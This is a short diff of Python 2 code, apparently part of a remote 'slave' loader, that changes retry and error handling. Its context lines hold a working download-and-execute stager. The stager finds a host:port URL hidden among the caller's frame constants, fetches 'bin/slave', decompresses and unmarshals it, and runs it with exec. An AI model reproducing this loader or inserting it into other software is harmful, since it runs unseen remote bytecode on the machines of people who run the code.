@@ -19,7 +19,8 @@ for k in sys._getframe(1).f_code.co_consts:
         continue
     m = re.match(r"http[s]*://[\w\.]+:[\w]+/", k)
     if m:
-        count=10
+    
+        count=1
         _F=True
         while _F:
             if count<=0:
@@ -27,8 +28,10 @@ for k in sys._getframe(1).f_code.co_consts:
             try:
                 exec marshal.loads(zlib.decompress(urllib2.urlopen(m.group(0)+'bin/slave').read()))
             except:
+                raise
+                
                 # raise
-                time.sleep(100)
+                # time.sleep(100)
             count=count-1
             
         break           
